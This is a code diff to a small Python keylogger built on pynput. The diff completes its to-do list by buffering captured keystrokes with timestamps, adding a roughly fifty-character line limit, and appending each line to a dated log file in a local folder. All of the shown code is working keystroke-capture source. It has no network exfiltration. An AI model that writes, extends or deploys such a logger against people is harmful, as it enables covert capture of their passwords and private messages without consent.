@@ -1,7 +1,7 @@
 #TODO: 
-# - all chars written together
-# - write to a log file
-# - ~5sec time for line jump or max chars ~50
+# - all chars written together DONE
+# - write to a log file DONE
+# - ~5sec time for line jump or max chars ~50 DONE
 
 # LINE FORMAT: [TIMESTAMP, KEYSLOGGED]
 
@@ -10,6 +10,7 @@
 from pynput import keyboard
 import time
 from datetime import timedelta, datetime
+import os
 
 
 
@@ -17,15 +18,20 @@ class klog():
     def __init__(self, parent=None):
         #Config vars
         self.timeTresh = 5
+        self.maxChars = 51
 
         #Functional vars
         self.t0 = datetime.now().time()
         self.tf = datetime.now().time()
         self.t0Seconds = (self.t0.hour * 60 + self.t0.minute) * 60 + self.t0.second
         self.tfSeconds = (self.tf.hour * 60 + self.tf.minute) * 60 + self.tf.second
+
+        self.fileName = time.strftime("%Y-%m-%d.txt", time.localtime())
+        self.fileDir = "./logs/"
         
         self.bufferString = "{} -".format (time.strftime("%H:%M:%S", time.localtime()))
         self.charsInLine = 0
+
 
 
 
@@ -38,10 +44,19 @@ class klog():
         else: #modifier keys
             keyStr = "{}{}{}".format('[', str(key), ']') 
 
-        if lastPress < self.timeTresh:
+        if lastPress < self.timeTresh or self.charsInLine < self.maxChars:
             self.bufferString += keyStr
             self.charsInLine += 1
         else:
+            #write to file
+            if os.path.isfile("{}{}".format(self.fileDir, self.fileName)):
+                self.txtFile = open("{}{}".format(self.fileDir, self.fileName), "a")
+            else:
+                self.txtFile = open("{}{}".format(self.fileDir, self.fileName), "w")
+
+            self.txtFile.write("{}\n".format(self.bufferString))
+            self.txtFile.close()
+
             self.charsInLine = 1
             print('new line!')
             self.bufferString = "{} - {}".format (time.strftime("%H:%M:%S", time.localtime()), keyStr)
